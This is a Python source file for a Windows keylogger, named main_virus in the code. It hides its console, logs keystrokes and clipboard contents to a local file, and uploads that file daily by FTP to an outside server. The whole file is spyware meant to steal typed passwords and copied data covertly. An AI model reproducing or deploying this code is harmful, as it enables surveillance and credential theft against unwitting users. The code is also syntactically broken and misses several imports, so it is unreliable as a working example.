##Importing the libraries
try:
    import time 
    import sys
    import os
    import pyperclip
    import threading
    from pynput.keyboard import Listener
    import ftplib
    import pythoncom, pyHook
except:
    print "Error"
    exit(0)

##Appending some libraries
sys.path.append(os.path.abspath("SO_site-packages"))

##Avoiding the exception of multiple running instances
mutex = win32event.CreateMutex(None, 1, 'mutex_var_xboz')
if win32api.GetLastError() == winerror.ERROR_ALREADY_EXISTS:
    mutex = None
    print("Error")
    exit(0)

##Hiding the console
def Hide():
    import win32console
    import win32gui
    win = win32console.GetConsoleWindow()
    win32gui.ShowWindow(win, 0)
Hide()

##Functions for keylogger
def log_keystroke(key):
    while True:
        key = str(key).replace("'", "")

        if key == 'Key.space':
            key = ' '
        if key == 'Key.shift_r':
            key = ''
        if key == "Key.enter":
            key = '\n'

        with open("log.txt", 'a') as f:
            f.write(key)

def key_logger():
    with Listener(on_press=log_keystroke, clipboard=clipboard_info) as current_log:
        current_log.join()

##Function for clipboardlogger
def clipboard_info():
    recent_value = ""
    while True:
        tmp_value = pyperclip.paste()
        if tmp_value != recent_value:
            recent_value = tmp_value
            with open("log.txt", 'a') as f:
                f.write("\nIn clipboard: %s\n" % str(recent_value)[:20])
        time.sleep(0.1)

##Put data on FTP
def ftp_upload:
    while True:
        session = ftplib.FTP('http://demo.wftpserver.com:5466/','demo-admin','demo-admin')
        file = open('log.txt','rb')                 
        session.storbinary('STOR log.txt', file)     
        file.close()                                   
        session.quit()
        time.sleep(86400)

##Main
def main_virus():
    keyThread = threading.Thread(target=key_logger)
    clipThread = threading.Thread(target=clipboard_info)
    ftpThread = threading.Thread(target=ftp_upload)
    keyThread.start()
    clipThread.start()
    ftpThread.start()

main_virus()
